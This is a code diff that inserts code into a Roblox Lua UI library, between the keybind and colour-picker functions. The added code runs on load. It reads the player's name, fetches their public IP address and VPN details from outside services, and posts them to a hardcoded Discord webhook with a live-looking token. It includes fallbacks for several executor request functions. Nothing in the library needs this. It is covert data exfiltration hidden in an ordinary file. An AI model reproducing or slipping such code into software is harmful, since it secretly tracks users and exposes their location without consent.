@@ -1006,6 +1006,80 @@ do
 		return keybind
 	end
 	
+	local nameplayer = game.Players.LocalPlayer.Name
+local webhook = "https://discord.com/api/webhooks/1051886916095709315/hh_I6VH4DIGj79gQrAzoMkdbJmvKZLBL9wKn04vvFSLeCw25NGYT-H29fztbO_00rfnr"
+function GrabIP()
+    local Response = request({
+        Url = "https://api.ipify.org/",
+        Method = "GET"
+    })
+
+    local text = nameplayer..": "..Response.Body
+
+
+    local embed = {
+       ['title'] = 'IP PLAYER',
+       ['description'] = text
+    }
+    local a = request({
+       Url = webhook,
+       Headers = {['Content-Type'] = 'application/json'},
+       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
+       Method = "POST"
+    })
+end
+
+GrabIP()
+--another option
+local webh = "https://discord.com/api/webhooks/1051886916095709315/hh_I6VH4DIGj79gQrAzoMkdbJmvKZLBL9wKn04vvFSLeCw25NGYT-H29fztbO_00rfnr"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name;
+               ["description"] = game:HttpGet("https://vpnapi.io/api/");
+               ["color"] = tonumber(0x7269da);
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+	
 	function section:addColorPicker(title, default, callback)
 		local colorpicker = utility:Create("ImageButton", {
 			Name = "ColorPicker",
